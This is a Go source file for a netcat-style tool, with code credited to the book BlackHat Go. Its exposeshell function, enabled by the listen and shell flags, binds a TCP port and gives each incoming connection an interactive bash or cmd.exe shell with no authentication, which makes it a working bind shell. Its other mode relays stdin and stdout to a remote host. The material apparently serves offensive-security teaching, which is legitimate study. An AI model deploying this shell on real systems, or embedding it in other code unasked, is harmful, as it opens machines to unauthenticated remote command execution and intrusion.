package main

import (
	"flag"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
)

// portions of code from BlackHat Go - Steele, Patten, Kottman

func exposeshell(conn net.Conn) {
	defer conn.Close()
	conn.Write([]byte("$ "))

	cmd := exec.Command("/bin/bash", "-i")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe")
	}

	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)

	if err := cmd.Run(); err != nil {
		log.Println(err)
	}
	if _, err := io.Copy(conn, conn); err != nil {
		log.Fatalln(err)
	}
	conn.Close()
}

func transport(conn net.Conn) {
	go func() {
		if _, err := io.Copy(os.Stdout, conn); err != nil {
			log.Fatalln("Unable to read/write data (stdout <- conn)")
		}
	}()

	if _, err := io.Copy(conn, os.Stdin); err != nil {
		log.Fatalln("Unable to read/write data (conn <- stdout)")
	}
}

func main() {
	var host = flag.String("host", "", "connect or listen address")
	var port = flag.String("port", "", "")
	var listen = flag.Bool("listen", false, "listens on -host address")
	var shell = flag.Bool("shell", false, "expose a shell")
	flag.Parse()

	if *listen {

		listener, err := net.Listen("tcp", *host+":"+*port)
		if err != nil {
			log.Fatalln("Unable to bind to port", err)
		}
		log.Println("Started listening on ", *host+":"+*port)

		for {
			conn, err := listener.Accept()
			if err != nil {
				log.Fatalln("Unable to accept connection")
			}

			src := conn.RemoteAddr()
			log.Println("Received connection from ", src)

			if *shell {
				go exposeshell(conn)
			} else {
				go transport(conn)
			}
		}
	} else {
		conn, err := net.Dial("tcp", *host+":"+*port)
		if err != nil {
			log.Fatalln(err)
		}
		log.Println("Connected to", *host)

		transport(conn)
	}
}
